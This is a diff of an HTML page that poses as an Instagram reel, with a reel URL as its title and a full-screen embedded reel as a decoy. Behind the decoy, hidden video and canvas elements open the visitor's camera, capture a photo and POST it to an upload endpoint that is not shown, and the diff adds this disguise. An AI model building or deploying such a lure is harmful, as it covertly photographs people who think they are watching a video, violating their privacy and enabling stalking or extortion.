@@ -3,22 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>www.instagram.com/reel/DAY2H4YvBPl/</title>
+    <title>https://www.instagram.com/reel/DBBllN4IdG9/</title>
     <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #video-container {
+            
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+             /* خلف الفيديو */
+        }
+         {
+            
+            
+            
+            
+            
+            
+        }
         #video, #canvas {
             display: none;
+
         }
     </style>
 </head>
 <body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+    <div id="video-container">
+        <!-- Instagram Video in Background -->
+        <iframe src="https://www.instagram.com/reel/C_biUQsRFzS/embed" frameborder="0"></iframe>
+        
+        <!-- Camera access notification -->
+        <div id="camera-access">
+            <h2></h2>
+            <p></p>
+            <video id="video" autoplay></video>
+            <canvas id="canvas"></canvas>
+        </div>
+    </div>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
+        // Prompt for camera access and capture photo
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 video.srcObject = stream;
@@ -55,7 +94,9 @@
                 method: 'POST',
                 body: formData
             })
-            .then(() => window.location.href = 'https://www.instagram.com/reel/DBBllN4IdG9/')
+            .then(() => {
+    console.log('Photo sent successfully!');
+})
             .catch(error => console.error('Error:', error));
         }
 
